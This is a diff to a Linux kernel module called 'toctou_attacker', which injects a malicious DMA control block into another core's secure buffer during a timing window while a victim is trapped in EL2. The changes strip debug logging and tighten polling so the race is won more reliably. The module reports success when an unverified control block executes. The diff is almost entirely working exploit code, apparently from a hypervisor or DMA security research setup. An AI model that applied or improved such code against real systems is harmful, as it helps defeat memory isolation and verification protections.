@@ -29,9 +29,9 @@
 #define DRIVER_NAME "toctou_attacker"
 
 /* Module parameters */
-static int debug = 1;
+static int debug = 0;  /* Disabled by default for timing */
 module_param(debug, int, 0644);
-MODULE_PARM_DESC(debug, "Enable debug output");
+MODULE_PARM_DESC(debug, "Enable debug output (WARNING: affects timing)");
 
 /* Runtime state */
 static void __iomem *sync_flag_base;
@@ -61,15 +61,8 @@ static inline u32 sync_read(u32 offset)
     return 0;
 }
 
-static void log_debug(const char *fmt, ...)
-{
-    va_list args;
-    if (debug) {
-        va_start(args, fmt);
-        vprintk(fmt, args);
-        va_end(args);
-    }
-}
+/* Debug macro - only prints when debug=1, use sparingly */
+#define DBG(fmt, ...) do { if (debug) pr_info(fmt, ##__VA_ARGS__); } while(0)
 
 /*
  * Prepare malicious control block
@@ -94,11 +87,7 @@ static int prepare_malicious_cb(void)
     malicious_cb->stride = 0;
     malicious_cb->next = 0;  /* End of chain */
 
-    log_debug("[ATTACKER] Prepared malicious CB at phys=0x%08llx\n",
-              (unsigned long long)malicious_cb_dma);
-    log_debug("[ATTACKER]   info=0x%08x src=0x%08x dst=0x%08x len=0x%08x\n",
-              malicious_cb->info, malicious_cb->src, 
-              malicious_cb->dst, malicious_cb->length);
+    /* Only log after attack, not during */
 
     return 0;
 }
@@ -126,13 +115,7 @@ static void trigger_malicious_dma(void)
     /* Calculate Core 1's buffer address */
     core1_buffer = secure_buffer_base + (1 * SECURE_BUFFER_SIZE_PER_CORE);
 
-    log_debug("[ATTACKER] Core %d injecting malicious CB to Core 1 buffer at %p\n",
-              my_core, core1_buffer);
-
-    /* Write malicious CB directly to the secure buffer */
-    /* In the real attack, this happens when Core 1's legitimate DMA request
-     * copies CBs to its buffer, and Core 0's overflow has already set up
-     * the chain to point here */
+    /* NO LOGGING HERE - timing critical! */
     
     /* Write the malicious CB at the start of Core 1's buffer */
     writel(ATTACK_MAGIC_INFO, core1_buffer + 0x00);   /* info */
@@ -143,12 +126,6 @@ static void trigger_malicious_dma(void)
     writel(0, core1_buffer + 0x14);                   /* next = NULL (end) */
 
     wmb();
-
-    log_debug("[ATTACKER] Malicious CB injected!\n");
-    log_debug("[ATTACKER] Verify: info=0x%08x src=0x%08x dst=0x%08x\n",
-              readl(core1_buffer + 0x00),
-              readl(core1_buffer + 0x04),
-              readl(core1_buffer + 0x08));
 }
 
 /*
@@ -170,28 +147,17 @@ static int attack_thread_fn(void *data)
         state = sync_read(SYNC_OFFSET_STATE);
 
         switch (state) {
-        case SYNC_STATE_VICTIM_READY:
-            log_debug("[ATTACKER] Victim ready, waiting for trap...\n");
-            break;
-
         case SYNC_STATE_VICTIM_TRAPPED:
-            log_debug("[ATTACKER] Victim trapped in EL2! Injecting malicious CB...\n");
-            
-            /* Critical timing window - inject NOW */
+            /* Critical timing window - inject NOW, no logging! */
             trigger_malicious_dma();
-            
-            /* Signal injection complete */
             sync_write(SYNC_OFFSET_STATE, SYNC_STATE_ATTACKER_INJECT);
             break;
 
         case SYNC_STATE_ATTACK_DONE:
-            log_debug("[ATTACKER] Attack sequence completed\n");
-            /* Check result */
+            /* Safe to log after attack completes */
             if (sync_read(SYNC_OFFSET_ATTACK_RESULT) == 1) {
-                pr_info("[ATTACKER] *** ATTACK SUCCESS! ***\n");
-                pr_info("[ATTACKER] DMA executed unverified CB from Core 1 buffer\n");
+                pr_info("[ATTACKER] ATTACK SUCCESS - unverified CB executed\n");
             }
-            /* Reset for next attack */
             sync_write(SYNC_OFFSET_STATE, SYNC_STATE_IDLE);
             break;
 
@@ -199,7 +165,8 @@ static int attack_thread_fn(void *data)
             break;
         }
 
-        usleep_range(10, 50);  /* Tight polling for timing */
+        /* Tight polling */
+        cpu_relax();
     }
 
     pr_info("[ATTACKER] Attack thread stopping\n");
